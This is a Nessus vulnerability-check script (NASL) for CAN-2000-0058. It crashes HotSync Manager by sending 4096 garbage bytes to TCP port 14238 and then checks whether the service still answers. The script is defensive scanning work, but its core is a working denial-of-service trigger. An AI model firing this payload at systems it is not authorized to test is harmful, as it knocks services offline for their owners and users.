#
# This script was written by Noam Rathaus <noamr@securiteam.com>
#
# See the Nessus Scripts License for details
#
#
if(description)
{
 script_id(10102);
 script_version ("$Revision: 1.10 $");
 script_bugtraq_id(920);
 script_cve_id("CAN-2000-0058");
 name["english"] = "HotSync Manager Denial of Service attack";
 script_name(english:name["english"]);
 
desc["english"] = "It is possible to cause HotSync Manager to crash by 
sending a few bytes
of garbage into its listening port TCP 14238.

Solution: Block those ports from outside communication

Risk factor : Low";

 script_description(english:desc["english"]);
 
 summary["english"] = "HotSync Manager Denial of Service attack";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 1999 SecuriTeam");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_require_ports(14238);
 
 exit(0);
}

#
# The script code starts here
#

if (get_port_state(14238))
{
 sock14238 = open_sock_tcp(14238);
 if (sock14238)
 {
  data_raw = crap(4096) + string("\n");
  send(socket:sock14238, data:data_raw);
  close(sock14238);

  sleep(5);

  sock14238_sec = open_sock_tcp(14238);
  if (sock14238_sec)
  {
   security_warning(port:14238, data:"HotSync Manager port is open.");
  }
  else
  {
   security_hole(port:14238);
  }
 }
}
